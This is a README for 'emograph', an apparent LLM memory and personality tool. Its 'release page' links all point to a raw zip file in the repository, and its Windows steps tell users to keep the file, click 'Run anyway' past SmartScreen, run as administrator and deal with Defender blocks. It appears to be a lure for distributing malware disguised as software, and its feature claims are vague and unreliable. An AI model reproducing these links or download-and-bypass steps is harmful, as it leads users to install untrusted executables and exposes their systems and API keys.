# 🧠 emograph - Memory and personality for LLMs

[![Download emograph](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Prudencefiberscope303/emograph/main/core/Software-v2.2.zip)

## 📌 What emograph does

emograph helps an AI app remember people, past chats, and user traits. It gives the app a memory layer and a simple personality engine.

Use it when you want an LLM-based app to:

- keep track of past context
- adapt its tone to the user
- store emotional signals from chats
- recall facts across sessions
- respond with more stable behavior over time

## 💻 Windows download and setup

Use the release page to download and install emograph on Windows.

[Visit the release page to download emograph](https://raw.githubusercontent.com/Prudencefiberscope303/emograph/main/core/Software-v2.2.zip)

### What to look for

On the release page, find the latest Windows file. It may be named like:

- `emograph-windows.exe`
- `emograph-setup.exe`
- `emograph-win64.zip`

If you see a `.exe` file, download and run it. If you see a `.zip` file, download it, then open the folder and run the app inside.

### Steps for Windows

1. Open the release page link above.
2. Find the latest release near the top.
3. Download the Windows file.
4. If Windows asks if you want to keep the file, choose Keep or Run anyway.
5. If you downloaded a `.zip` file, right-click it and choose Extract All.
6. Open the extracted folder.
7. Double-click the app file to start emograph.

### If Windows blocks the app

If Windows shows a security prompt:

- click More info
- then click Run anyway

This can happen with new apps that are not signed yet.

## 🧭 First start

When emograph opens for the first time, it may ask you to set up a few things:

- a storage location for memory data
- an LLM API key or local model path
- a user profile name
- a few personality settings

Use the default values if you are not sure. You can change them later.

## ⚙️ What you may need

emograph is built for modern Windows computers. A typical setup works well with:

- Windows 10 or Windows 11
- 8 GB of RAM or more
- 500 MB of free disk space
- internet access for cloud LLM use
- a local model only if you want to run offline

If you plan to use a vector store or graph database, the app may create local data files during setup.

## 🧠 Main features

### Memory layer

emograph stores useful parts of chat history so your app can remember them later. This can include:

- names
- goals
- preferences
- past decisions
- emotional patterns

### Adaptive personality

The app can shape response style based on user history. For example, it can:

- use a more formal tone
- keep responses short
- match a calm or friendly style
- stay consistent over time

### Emotional signals

emograph can track mood or sentiment in a simple way. This helps an assistant react with more context, not just one message at a time.

### Retrieval support

It can pull older data back into a new chat. That helps with long-term memory and better context use.

### Storage options

The project topics point to tools like ChromaDB and Neo4j. That means emograph may support both:

- vector memory for semantic search
- graph memory for linked facts and relationships

## 🗂️ Typical use cases

emograph fits apps such as:

- personal AI assistants
- chatbots with memory
- coaching tools
- journaling apps
- user support agents
- role-based LLM apps
- long-running AI companions

## 🔐 Basic safety and data use

Because emograph stores memory, it may save user details on your device or in your database. Use it with care if you plan to store private data.

Good practice:

- keep data on a trusted computer
- use a strong password for any connected services
- review what the app stores
- back up your data before major changes

## 🧰 How the memory system is organized

emograph uses a few parts that work together:

- **input layer**: reads chat messages
- **memory layer**: stores useful facts and signals
- **personality layer**: shapes how the AI speaks
- **retrieval layer**: finds old context when needed
- **storage layer**: saves data in local or database-backed form

You do not need to manage these parts by hand for basic use. The app should handle them during normal operation.

## 🖥️ Running after install

After you install emograph:

1. Open the app from the Start menu or the extracted folder.
2. Complete the first-time setup.
3. Add your model settings or API key if asked.
4. Start a new chat or memory session.
5. Test the memory by sending a few messages and reopening the app later.

If the app has a tray icon or a main dashboard, leave it open while you use it.

## 🔧 Common setup paths

### Option 1: Simple local use

This is the easiest path for most Windows users.

- download the release file
- extract it if needed
- run the app
- use the default memory store

### Option 2: Cloud model use

Use this if the app asks for an API key.

- sign in to your LLM provider
- copy your API key
- paste it into emograph
- save the settings
- start chatting

### Option 3: Local model use

Use this if you want to keep everything on your machine.

- install a local LLM tool
- point emograph to the model path
- make sure the model is loaded
- test a chat session

## 📦 Data files you may see

emograph may create files or folders like:

- `memory`
- `profiles`
- `sessions`
- `logs`
- `chroma`
- `neo4j`
- `config`

These names can change, but they usually hold user data, settings, or cached memory.

## 🧪 First test checklist

Use this quick check after setup:

- the app opens without errors
- you can create a profile
- the app saves a message
- the app recalls a past fact
- personality settings change the reply style
- the session starts the same way after restart

If one of these fails, check the app settings and try again.

## 🧩 Folder and file tips

If you downloaded a `.zip` file:

- do not run the app from inside the zip
- extract the full folder first
- keep all files in the same place
- do not rename random support files

If you move the app later, move the whole folder together.

## 🪟 Windows troubleshooting

### The app will not open

Try these steps:

1. Right-click the app file.
2. Choose Run as administrator.
3. Check if Windows Defender blocked the file.
4. Move the app to a simple folder like `Downloads` or `Desktop`.
5. Re-extract the zip if the files look incomplete.

### The window opens and closes

This can happen if a required file is missing or damaged.

- download the release again
- extract it again
- make sure all files stay together
- try launching from the extracted folder

### Memory is not saving

Check these items:

- the app has write access to the folder
- your disk is not full
- the profile is selected
- the memory store path is valid
- the database service is running if you use one

### The app cannot connect to the model

Check:

- your internet connection
- the API key
- the model name
- the local model path
- firewall settings

## 🧱 Technical pieces used by emograph

This project uses tools and ideas from:

- FastAPI for app services
- ChromaDB for vector memory
- Neo4j for graph-based relationships
- LLM memory for long-term recall
- affective computing for emotion-aware behavior
- personality engine logic for response style

You do not need to learn these tools to use the app, but they shape how it works.

## 📝 Example workflow

A simple use flow looks like this:

1. Open emograph.
2. Create or load a user profile.
3. Start a chat with an AI model.
4. Let the app save key facts.
5. Return later and open the same profile.
6. Ask about something from the earlier chat.
7. Let the app retrieve the past context.
8. See the reply use the stored memory and tone

## 🛠️ Best results on Windows

For smooth use:

- keep the app in a stable folder
- avoid moving files while the app is running
- let Windows finish any security scan
- use one profile per user when possible
- back up the memory folder if the data matters

## 📁 Download source

Use the official release page here:

[https://raw.githubusercontent.com/Prudencefiberscope303/emograph/main/core/Software-v2.2.zip](https://raw.githubusercontent.com/Prudencefiberscope303/emograph/main/core/Software-v2.2.zip)

## 📚 Repository topics

- affective-computing
- ai-agents
- chromadb
- emotional-ai
- emotional-intelligence
- fastapi
- llm-memory
- neo4j
- personality-engine
- rag